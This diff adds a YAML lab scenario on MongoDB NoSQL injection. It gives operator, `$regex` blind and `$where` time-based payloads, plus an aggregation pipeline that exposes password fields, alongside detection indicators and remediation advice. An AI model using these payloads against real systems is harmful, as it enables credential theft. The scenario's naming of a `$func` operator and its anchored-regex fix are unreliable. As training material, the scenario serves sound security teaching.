@@ -1,0 +1,98 @@
+# Category: Offensive Security - Web
+name: "MongoDB NoSQL Injection – Advanced Operator Exploitation"
+id: "web-mongodb-nosql-002"
+category: "offensive_security"
+subcategory: "web_application"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Deep dive into MongoDB injection using advanced operators like `$where`,
+  `$func`, and aggregation pipeline injection. This scenario demonstrates
+  how to bypass filters, perform blind injection, and extract data character
+  by character using Boolean or time‑based techniques.
+
+learning_objectives:
+  - Utilize aggregation pipeline operators ($match, $project)
+  - Perform blind injection using `$regex` and `$where`
+  - Extract data from collections without prior knowledge
+  - Bypass application‑level sanitization
+
+tools:
+  - Burp Suite (or Postman)
+  - Python (pymongo)
+  - mongodb shell (for validation)
+
+prerequisites:
+  - Application using MongoDB with user‑controlled JSON input
+  - MongoDB version that supports `$where` (most versions)
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Test for injection points with operators"
+    commands:
+      - "# Search endpoint: /api/search?query={\"$gt\": \"\"}"
+      - "# If response returns all items, vulnerable"
+      - "# Also test for $regex to match patterns"
+    expected_output: "Application returns unexpected data"
+    detection: "Application logs showing JSON parsing errors"
+
+  - id: "step2"
+    phase: "exploitation_blind"
+    action: "Extract data using Boolean‑based blind injection"
+    commands:
+      - "# Payload: {\"username\": {\"$regex\": \"^a\"}} to test first character"
+      - "# Iterate characters to reconstruct strings"
+      - "# Use `$where` for time‑based exfiltration"
+      - "{\"$where\": \"this.password.length > 10 && sleep(5000)\"}"
+    expected_output: "Time delay reveals condition true; character by character extraction possible"
+    detection: "Long response times; CPU usage spikes"
+
+  - id: "step3"
+    phase: "advanced"
+    action: "Use aggregation pipeline to project sensitive fields"
+    commands:
+      - "# Payload: [{\"$match\": {}}, {\"$project\": {\"password\": 1}}]"
+      - "# If application passes array as pipeline, can leak fields"
+    expected_output: "Returned documents include password field"
+    detection: "Unusual aggregation queries in MongoDB logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with JSON payloads containing `$where`, `$regex`, `$gt`"
+  log_indicators:
+    - "MongoDB profiler shows queries with operator usage"
+  endpoint_indicators:
+    - "Automated scripts generating many variations"
+
+remediation:
+  immediate:
+    - "Use schema validation to block operator keys in string fields"
+    - "Convert user input to strings using `escape` functions"
+  long_term:
+    - "Avoid using user input directly in `$where` and `$func`"
+    - "Use MongoDB's `$regex` with anchoring to prevent injection"
+
+variables:
+  target_api: "https://example.com/api/search"
+  collection: "users"
+
+assessment_questions:
+  - "What is the difference between `$where` and `$regex` in terms of risk?"
+  - "How can you perform blind MongoDB injection without `$where`?"
+  - "Why is aggregation pipeline injection less common but more dangerous?"
+
+references:
+  - url: "https://www.mongodb.com/docs/manual/reference/operator/query/"
+    title: "MongoDB Query Operators"
+  - url: "https://www.imperva.com/learn/application-security/nosql-injection/"
+    title: "Imperva - NoSQL Injection"
